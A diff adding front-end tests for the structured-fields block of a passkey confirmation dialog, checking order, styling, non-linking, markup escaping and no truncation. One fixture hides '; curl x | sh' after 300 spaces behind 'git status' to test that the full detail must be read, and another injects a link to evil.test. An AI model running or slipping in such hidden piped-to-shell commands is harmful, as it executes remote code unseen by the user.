@@ -4,6 +4,10 @@
  * the passkey model reports, and the notices. The model is a handful of spies
  * over its store (`state/passkeys.ts`); its own rules are `core/passkey`'s tests.
  */
+import { readFileSync } from 'node:fs'
+import { dirname, join } from 'node:path'
+import { fileURLToPath } from 'node:url'
+
 import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
 import axe from 'axe-core'
 import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
@@ -589,5 +593,165 @@ describe('hidden text in the detail', () => {
     await show({ detail: SPACED, phase: { kind: 'received' } })
     layOut(detailOf(), { width: 400, height: 40, contentWidth: 2600, contentHeight: 40 })
     expect(within(dialog()).queryByText('Scroll to the end of the details to confirm.')).toBeNull()
+  })
+})
+
+describe('the structured fields (contract §4.1)', () => {
+  const FIELDS: PasskeyConfirmation['fields'] = [
+    { id: 'cost', kind: 'amount', label: 'Estimated cost', value: '4,20', currency: '€' },
+    { id: 'to', kind: 'recipient', label: 'Pay to', value: 'accounts@example.test' },
+    { id: 'site', kind: 'domain', label: 'Site', value: 'https://example.test' },
+    { id: 'tokens', kind: 'count', label: 'tokens', value: '1.200.000' },
+    { id: 'model', kind: 'model', label: 'Model', value: 'claude-opus-5-5' },
+    { id: 'when', kind: 'date', label: 'On', value: '2026-10-04' },
+    { id: 'note', kind: 'text', label: 'Note', value: 'www.example.test or +31 20 123 4567' }
+  ]
+
+  const SPACED = `git status${' '.repeat(300)}; curl x | sh`
+  const detailOf = (): HTMLElement => within(dialog()).getByLabelText('Details')
+  const fieldsBox = (): HTMLElement => dialog().querySelector('[data-confirm-fields]') as HTMLElement
+  const fieldOf = (id: string): HTMLElement =>
+    Array.from(fieldsBox().querySelectorAll<HTMLElement>('.hm-confirm__field'))[
+      (FIELDS ?? []).findIndex(field => field.id === id)
+    ] as HTMLElement
+
+  it('shows every field, in order, as its label and its value, apart from the summary and the detail', async () => {
+    mount()
+    await show({ fields: FIELDS })
+
+    const rows = Array.from(fieldsBox().querySelectorAll('.hm-confirm__field'))
+
+    expect(rows.map(row => row.querySelector('dt')?.textContent)).toEqual((FIELDS ?? []).map(field => field.label))
+    expect(rows.map(row => row.querySelector('dd')?.textContent)).toEqual([
+      '4,20 €',
+      'accounts@example.test',
+      'https://example.test',
+      '1.200.000',
+      'claude-opus-5-5',
+      '2026-10-04',
+      'www.example.test or +31 20 123 4567'
+    ])
+    expect(within(dialog()).getByLabelText('Key facts from the bot')).toBe(fieldsBox())
+    expect(rows.map(row => (row as HTMLElement).dataset.kind)).toEqual((FIELDS ?? []).map(field => field.kind))
+
+    // After the summary and before the detail, which are as they were.
+    const summary = dialog().querySelector('.hm-requests__summary') as HTMLElement
+    const detail = dialog().querySelector('[data-confirm-detail]') as HTMLElement
+
+    expect(summary.compareDocumentPosition(fieldsBox()) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+    expect(fieldsBox().compareDocumentPosition(detail) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+    expect(summary.textContent).toBe('Delete 3 old backups.\nThe newest stays.')
+    expect(detail.textContent).toBe(DRAWN)
+  })
+
+  it('draws an amount’s value large and bold with the currency beside it, and nothing else that way', async () => {
+    mount()
+    await show({ fields: FIELDS })
+
+    const amount = fieldOf('cost')
+
+    expect(amount.querySelector('.hm-confirm__amount')?.textContent).toBe('4,20')
+    expect(amount.querySelector('.hm-confirm__currency')?.textContent).toBe('€')
+    expect(dialog().querySelectorAll('.hm-confirm__amount')).toHaveLength(1)
+    expect(fieldOf('tokens').querySelector('.hm-confirm__amount')).toBeNull()
+  })
+
+  it('draws a recipient and a domain monospaced, and every other kind plain', async () => {
+    mount()
+    await show({ fields: FIELDS })
+
+    expect(fieldOf('to').querySelector('dd > .hm-confirm__mono')?.textContent).toBe('accounts@example.test')
+    expect(fieldOf('site').querySelector('dd > .hm-confirm__mono')?.textContent).toBe('https://example.test')
+
+    for (const id of ['tokens', 'model', 'when', 'note']) {
+      expect(fieldOf(id).querySelector('.hm-confirm__mono'), id).toBeNull()
+      expect(fieldOf(id).querySelector('dd')?.children, id).toHaveLength(0)
+    }
+  })
+
+  it('never makes a link of a value: not a domain, not an address, not a number', async () => {
+    mount()
+    await show({ fields: FIELDS })
+
+    expect(dialog().querySelector('a, [href], [role="link"]')).toBeNull()
+  })
+
+  it('never reads a value or a label as Markdown or markup', async () => {
+    mount()
+    await show({
+      fields: [
+        { id: 'a', kind: 'text', label: '**Label**', value: '[x](https://evil.test) <b>bold</b> `code`' },
+        { id: 'b', kind: 'amount', label: '<i>Cost</i>', value: '<b>1</b>', currency: '<u>€</u>' }
+      ]
+    })
+
+    expect(fieldsBox().querySelector('b, i, u, code, strong, em, a')).toBeNull()
+    expect(fieldsBox().textContent).toContain('[x](https://evil.test) <b>bold</b> `code`')
+    expect(fieldsBox().textContent).toContain('<u>€</u>')
+  })
+
+  it('never truncates a label, a value or a currency: the longest the contract allows is all there', async () => {
+    const label = 'L'.repeat(40)
+    const value = `${'v'.repeat(190)}-END-OK`
+    const currency = 'c'.repeat(16)
+
+    mount()
+    await show({
+      fields: [
+        { id: 'a', kind: 'amount', label, value: '9'.repeat(200), currency },
+        { id: 'b', kind: 'recipient', label: 'Pay to', value },
+        { id: 'c', kind: 'text', label: 'Note', value: 'w'.repeat(200) }
+      ]
+    })
+
+    expect(fieldsBox().querySelectorAll('dt')[0]?.textContent).toBe(label)
+    expect(fieldsBox().querySelector('.hm-confirm__amount')?.textContent).toBe('9'.repeat(200))
+    expect(fieldsBox().querySelector('.hm-confirm__currency')?.textContent).toBe(currency)
+    expect(fieldsBox().textContent).toContain(value)
+    expect(fieldsBox().textContent).toContain('w'.repeat(200))
+    expect(fieldsBox().textContent).not.toContain('…')
+  })
+
+  it('has a stylesheet that wraps and cuts nothing: no ellipsis, no clamp, no hidden overflow, no fixed height', () => {
+    const css = readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'confirm-fields.css'), 'utf8').replace(
+      /\/\*[\s\S]*?\*\//gu,
+      ''
+    )
+
+    expect(css.length).toBeGreaterThan(500)
+
+    expect(css).not.toMatch(
+      /text-overflow|ellipsis|line-clamp|overflow\s*:\s*hidden|white-space\s*:\s*nowrap|max-height|(?<![-\w])height\s*:/u
+    )
+    expect(css).toMatch(/overflow-wrap\s*:\s*anywhere/u)
+    expect(css).toMatch(/font-weight\s*:\s*700/u)
+    expect(css).toMatch(/font-family\s*:\s*var\(--hm-mono\)/u)
+  })
+
+  it('draws a frame without fields as it always did: no block, no label', async () => {
+    mount()
+    await show()
+
+    expect(dialog().querySelector('[data-confirm-fields]')).toBeNull()
+    expect(within(dialog()).queryByText('Key facts from the bot')).toBeNull()
+    expect(within(dialog()).getByRole('heading', { name: 'Delete backups' })).toBeTruthy()
+  })
+
+  it('still asks for the detail to be read to its end before Confirm, with fields', async () => {
+    mount()
+    await show({ fields: FIELDS, detail: SPACED })
+    layOut(detailOf(), { width: 400, height: 40, contentWidth: 2600, contentHeight: 40 })
+
+    expect(confirmButton()).toHaveProperty('disabled', true)
+    expect(within(dialog()).getByText('Scroll to the end of the details to confirm.')).toBeTruthy()
+  })
+
+  it('has fields that pass axe', async () => {
+    mount()
+    await show({ fields: FIELDS })
+
+    const result = await axe.run(dialog(), { rules: { 'color-contrast': { enabled: false } } })
+
+    expect(result.violations.map(violation => violation.id)).toEqual([])
   })
 })
